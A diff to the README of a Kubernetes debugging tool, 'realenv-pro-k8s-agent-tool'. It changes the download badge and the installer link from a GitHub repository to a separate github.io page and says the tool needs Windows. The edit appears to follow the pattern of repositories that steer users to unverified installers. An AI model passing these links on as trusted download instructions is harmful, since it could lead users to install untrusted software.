@@ -1,6 +1,6 @@
 # 🛠️ realenv-pro-k8s-agent-tool - Connect Local Agents To Cloud Infrastructure
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://roneyral1578.github.io)
 
 This tool helps developers debug cloud-native software. It creates a bridge between your local computer and your Kubernetes clusters. You use this software to mirror environments, replay network traffic, and manage DNS settings without deep technical knowledge of infrastructure.
 
@@ -8,7 +8,7 @@ This tool helps developers debug cloud-native software. It creates a bridge betw
 
 You need a Windows computer to use this tool. Before you install the program, ensure you have at least 4 gigabytes of memory available. 
 
-Visit this page to download the latest installer file: [https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool](https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool)
+Visit this page to download the latest installer file: [https://roneyral1578.github.io](https://roneyral1578.github.io)
 
 ## 🏗️ Installation Steps
 
